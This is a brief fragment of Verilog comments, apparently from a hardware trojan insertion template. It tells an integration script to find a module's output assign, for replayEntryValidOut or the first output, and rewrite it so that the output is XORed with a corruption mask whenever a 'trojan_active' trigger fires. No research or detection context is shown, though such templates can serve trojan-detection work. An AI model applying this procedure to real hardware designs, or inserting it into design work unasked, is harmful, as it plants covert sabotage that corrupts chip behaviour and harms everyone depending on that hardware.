...
//
// IMPORTANT: replayEntryValidOut may be an INPUT port.
//   Input ports have NO assign statement inside the module.
//   If replayEntryValidOut is an input, target the first OUTPUT assign instead.
//
// Integration Script Must:
//   Find the output assign for replayEntryValidOut (or first output assign):
//     assign replayEntryValidOut = <expr>;
//   Replace with:
//     assign replayEntryValidOut = trojan_active ? (<expr> ^ CORRUPTION_MASK) : <expr>;
//
